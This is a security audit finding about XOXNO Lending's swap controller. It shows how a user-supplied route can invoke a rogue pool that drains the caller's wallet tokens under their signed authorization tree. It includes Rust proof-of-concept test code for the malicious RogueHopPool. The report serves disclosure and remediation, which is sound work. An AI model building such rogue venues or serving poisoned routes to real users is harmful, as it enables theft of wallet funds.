### Title
User-supplied swap route lets arbitrary venues execute under the caller's authorization tree and drain wallet tokens beyond the routed input - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The n8n bug class is a restriction ("Allowed HTTP Request Domains") meant to confine where a privileged action can send secrets, silently bypassed whenever the caller supplies the endpoint. XOXNO Lending has the same shape: the controller is designed to grant the swap router exactly one scoped authorization — a single exact-amount input-token transfer — but the route bytes the user passes to `multiply`, `swap_debt`, `swap_collateral`, or `repay_debt_with_collateral` name the venue/pool contracts the router invokes. Nothing in the controller or router constrains those venues, so a malicious route puts attacker code on the call stack *below* the caller's signed authorization, where it can issue additional `token::transfer` calls from the caller's address that simulation records as children of the caller's auth entry. A signer who approves the simulated tree loses wallet funds unrelated to the swap.

### Finding Description
`swap_tokens` builds the intended trust boundary: it snapshots balances, calls `authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in)` — one transfer, exact amount — then executes the user-supplied `StrategySwap` payload via `router.execute_strategy` inside the flash guard [1](#0-0) . The post-execution checks (`RouterOverspend`, `NoSwapOutput`) only measure the controller's own `token_in`/`token_out` deltas [2](#0-1) . They bound what the *controller* spends, not what code reached through the route does with the *caller's* authorization.

The payload's asset registry and ops name arbitrary `pool`/venue addresses, and the router keeps no allowlist of them. The threat model itself confirms the gap: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization. A token transfer that such code makes from the caller is recorded by an honest simulation as a child of the caller's authorization entry, and it executes if the caller signs that tree. The loss is then the caller's wallet, not the routed amount" [3](#0-2) .

The harness test `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` proves it end-to-end: a router double invokes the payload-named `RogueHopPool`, which calls `token::transfer(victim, attacker, WALLET_BALANCE)`; simulation records that transfer as a sub-invocation of Alice's `swap_collateral` auth entry, and with the tree signed, Alice's unrelated `wallet_token` balance goes to zero while the swap still settles `FAIR_OUT_ETH` [4](#0-3) [5](#0-4) .

### Impact Explanation
Theft of user funds. A user calling `swap_collateral` (or `multiply`, `swap_debt`, `repay_debt_with_collateral`) with an attacker-crafted route — e.g., a poisoned `routeXdr` served by a compromised or malicious quote path — signs an auth tree that silently includes transfers of every token the rogue venue names, in any amount the victim holds. None of the controller's measured-delta checks observe this, because the drained tokens are neither `token_in` nor `token_out` and never touch the controller's balance. The loss is bounded only by the victim's wallet balances, not by `amount_in`.

### Likelihood Explanation
Reachable by any unprivileged address: the route bytes are a free-form user argument to four public controller verbs. The exploit does require the victim to sign a transaction whose simulated auth tree contains the malicious child — a client that decodes the tree and rejects unexpected children is safe — but default wallet flows present simulation-produced auth as the thing to sign, and nothing in the protocol rejects the poisoned route on-chain. The finding is documented in the threat model as residual risk pushed to clients, with no on-chain mitigation.

### Recommendation
Enforce a venue allowlist at the router boundary the same way n8n enforces its domain allowlist: governance-maintained set of approved pool/venue addresses, and have `execute_strategy` (or the controller before forwarding `swap_xdr`) decode the payload's `assets`/ops and reject any instruction referencing a non-allowlisted contract. Short of that, the controller could restrict strategy verbs to contract callers that sign their own nested auth (EOA-signed strategy routes carry the risk). At minimum, surface a `verifyRouteBytes`-equivalent check so off-chain tooling cannot produce routes with unlisted venues.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Deploy `UnlistedPoolRouter` (honest payout, invokes whichever `hop_pool` the payload names) and set it via `set_swap_aggregator` [6](#0-5) .
2. Build a route whose hop pool is `RogueHopPool` configured with `(victim = alice, wallet_token, to = attacker, amount = WALLET_BALANCE)` [7](#0-6) .
3. Alice calls `controller.swap_collateral(alice, account_id, USDC, SWAP_IN_USDC, ETH, route)`. Simulation records the rogue `transfer(alice → attacker, WALLET_BALANCE)` as a child of her `swap_collateral` auth; signing that tree executes it [8](#0-7) .
4. Result: `wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`, while the legitimate swap output `FAIR_OUT_ETH` still lands — all controller checks pass [9](#0-8) .

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L30-54)
```rust
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-160)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-72)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L90-94)
```rust
        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```
